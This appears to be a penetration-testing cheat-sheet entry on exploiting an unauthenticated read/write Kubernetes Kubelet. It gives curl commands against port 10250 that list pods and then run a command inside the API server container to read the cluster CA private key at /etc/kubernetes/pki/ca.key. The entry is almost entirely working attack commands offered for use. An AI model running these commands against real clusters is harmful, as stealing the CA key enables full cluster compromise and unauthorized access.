## Unauthenticated Read/Write Kubelet

1. Exploiting this takes a couple of steps
2. Get a list of running pods curl -k https://[CLUSTERIP]:10250/pods/ | jq
3. From this output find the name of the pod and container running the Kubernetes API server
4. Retrieve the key curl https://[CLUSTERIP]:10250/run/[Namespace]/[Pod]/[Container] -k -XPOST -d "cmd=cat /etc/kubernetes/pki/ca.key"